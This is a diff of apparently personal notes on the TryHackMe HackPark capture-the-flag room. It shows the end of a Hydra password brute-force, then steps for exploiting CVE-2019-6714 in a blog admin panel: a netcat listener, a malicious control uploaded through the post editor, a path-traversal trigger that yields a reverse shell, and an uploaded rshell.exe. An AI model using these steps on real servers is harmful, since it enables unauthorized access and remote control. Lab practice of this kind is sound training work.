@@ -24,4 +24,29 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-07 22:26:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-07 22:27:24
                                                                                                        
-┌──(kali㉿kali)-[~/THM/HackPark]
+Task 3.
+Login, About, Version 3.x.x.x
+
+https://www.exploit-db.com/exploits/46353
+
+CVE-2019-6714
+
+$ nc -lvnp 4445
+
+
+Change IP/port in exploit
+
+upload PostView.ascx thru /admin/app/editor/editpost.cshtml (folder icon)
+
+access /?theme=../../App_Data/files to load file/exploit
+
+Access to server thru NC
+
+whoami
+iis apppool\blog
+
+Upload rshell.exe to server (use/admin/app/editor/editpost.cshtml (folder icon))
+
+c:\inetpub\wwwroot\App_Data\files\rshell.exe
+
+
